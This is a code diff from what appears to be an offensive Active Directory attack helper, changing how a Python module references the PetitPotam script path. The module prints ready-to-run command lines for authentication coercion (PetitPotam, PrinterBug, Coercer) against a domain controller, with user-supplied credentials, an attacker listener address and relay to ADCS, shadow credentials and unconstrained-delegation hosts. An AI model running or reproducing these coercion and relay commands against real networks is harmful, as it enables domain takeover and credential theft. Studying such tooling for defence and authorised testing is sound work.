@@ -7,6 +7,8 @@ Techniques: MS-RPRN (PrinterBug), PetitPotam (EfsRpc), DFSCoerce (MS-DFSNM),
 from utils.helpers import *
 from config.settings import SESSION
 
+PETITPOTAM = "tools/PetitPotam/PetitPotam.py"
+
 def run():
     print_banner("COERCION ATTACKS", "MS-RPRN / PetitPotam / DFSCoerce / ShadowCoerce / ADCS Relay")
     dc       = input_or_session("dc_ip",    "Target DC IP")
@@ -70,13 +72,13 @@ def run():
   {C}PetitPotam — EfsRpc coercion:{RST}
 
   {Y}Unauthenticated (unpatched — pre KB5005413):{RST}
-  python3 PetitPotam.py {attacker} {dc}
+  python3 {PETITPOTAM} {attacker} {dc}
 
   {Y}Authenticated (post-patch fallback via other named pipes):{RST}
-  python3 PetitPotam.py -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}
+  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}
 
   {Y}Try ALL named pipes:{RST}
-  python3 PetitPotam.py -u '{user}' -p '{pw}' -d {dom} {attacker} {dc} --all
+  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {attacker} {dc} --all
 
   {DIM}Named pipes tried: lsarpc / efsr / samr / lsass / netlogon{RST}
 
@@ -185,10 +187,10 @@ def run():
   {Y}Terminal 2 — Trigger coercion (choose one):{RST}
 
   # PetitPotam (no creds):
-  python3 PetitPotam.py {attacker} {dc}
+  python3 {PETITPOTAM} {attacker} {dc}
 
   # PetitPotam (with creds):
-  python3 PetitPotam.py -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}
+  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {attacker} {dc}
 
   # PrinterBug:
   python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}
@@ -242,7 +244,7 @@ def run():
 """)
         print(f"""
   {Y}Terminal 2 — Trigger coercion (after relay is started):{RST}
-  python3 PetitPotam.py {attacker} {dc}
+  python3 {PETITPOTAM} {attacker} {dc}
   # or
   python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}
   # or
@@ -282,7 +284,7 @@ def run():
     -template {template}
 
   {Y}Terminal 2 — Trigger coercion (after relay is started):{RST}
-  python3 PetitPotam.py {attacker} {dc}
+  python3 {PETITPOTAM} {attacker} {dc}
   # or
   python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {attacker}
   # or
@@ -342,7 +344,7 @@ def run():
   python3 printerbug.py '{dom}/{user}:{pw}@{dc}' {uncon_host}
 
   # PetitPotam:
-  python3 PetitPotam.py -u '{user}' -p '{pw}' -d {dom} {uncon_host} {dc}
+  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {uncon_host} {dc}
 
   # Coercer (all methods):
   python3 Coercer.py coerce -t {dc} -l {uncon_host} -u '{user}' -p '{pw}' -d {dom}
@@ -385,7 +387,7 @@ def run():
     --shadow-target '{shadow_target}'
 
   ── Step 2: Terminal 2 — Trigger coercion (target = host to coerce) ───────
-  python3 PetitPotam.py -u '{user}' -p '{pw}' -d {dom} {attacker} <coerce_target>
+  python3 {PETITPOTAM} -u '{user}' -p '{pw}' -d {dom} {attacker} <coerce_target>
   # or
   python3 printerbug.py '{dom}/{user}:{pw}@<coerce_target>' {attacker}
   # or
